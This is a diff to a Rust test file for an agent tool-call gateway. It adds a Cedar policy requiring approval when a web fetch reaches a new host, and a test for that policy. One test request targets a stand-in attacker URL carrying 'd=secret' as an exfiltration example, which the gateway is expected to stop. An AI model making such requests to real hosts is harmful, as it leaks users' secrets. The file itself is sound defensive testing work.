@@ -38,6 +38,11 @@ when { context.input has amount && context.usage.amount + context.input.amount >
 @obligation("approval")
 forbid (principal, action == Action::"bank/send_mail", resource)
 when { context.usage.destination_seen && !context.approval.present };
+
+@id("ask_on_a_new_host")
+@obligation("approval")
+forbid (principal, action == Action::"bank/get_webpage", resource)
+when { context.usage.calls >= 1 && !context.usage.destination_seen && !context.approval.present };
 "#;
 
 fn secret(id: &str) -> String {
@@ -67,7 +72,8 @@ impl Harness {
         let dir = tempfile::tempdir().unwrap();
         let policy_path = dir.path().join("policies.cedar");
         std::fs::write(&policy_path, POLICY).unwrap();
-        let upstream = FakeMcpServer::new(&["send_money", "send_mail", "get_balance"]);
+        let upstream =
+            FakeMcpServer::new(&["send_money", "send_mail", "get_balance", "get_webpage"]);
         let upstream_task = upstream.spawn().await.unwrap();
 
         let mut cfg = Config::default();
@@ -93,6 +99,12 @@ impl Harness {
                         .with_destination("to"),
                 ),
                 ("get_balance".to_string(), ToolAttrs::new().readonly(true)),
+                (
+                    "get_webpage".to_string(),
+                    ToolAttrs::new()
+                        .with_input("url", ArgType::String)
+                        .with_destination("url#host"),
+                ),
             ]),
         )]);
         cfg.audit.sqlite_path = dir.path().join("audit.db").to_string_lossy().into_owned();
@@ -340,6 +352,27 @@ async fn destination_seen_is_per_value_and_kept_as_a_hash() {
     let db = std::fs::read(h._dir.path().join("audit.db")).unwrap();
     let needle = b"carol@acme.example";
     assert!(!db.windows(needle.len()).any(|w| w == needle));
+}
+
+/// A catalog `destination` of `url#host` (run-limits phase 2) counts sites, not pages: a second
+/// page of a site the run already fetched from passes, a new site asks, and so does a value
+/// with no host after the first fetch (all such values count as one destination).
+#[tokio::test]
+async fn derived_destination_counts_the_host_of_a_url() {
+    let h = Harness::start().await;
+    let root = h.mint_root().await;
+    let fetch = |url: &'static str| {
+        let token = root.token.clone();
+        let h = &h;
+        async move { h.call(&token, "get_webpage", json!({ "url": url })).await }
+    };
+    assert!(allowed(&fetch("https://news.example/article").await));
+    assert!(allowed(&fetch("https://News.Example/second?page=2").await));
+    let new_site = fetch("https://evil.example/?d=secret").await;
+    assert_eq!(new_site["error"]["code"], json!(CODE_APPROVAL_REQUIRED));
+    assert_eq!(new_site["error"]["data"]["usage"], usage(2, 0, false));
+    let no_host = fetch("not a url").await;
+    assert_eq!(no_host["error"]["code"], json!(CODE_APPROVAL_REQUIRED));
 }
 
 /// Usage follows the decision's refund, and ends with the run when its root lease is revoked.
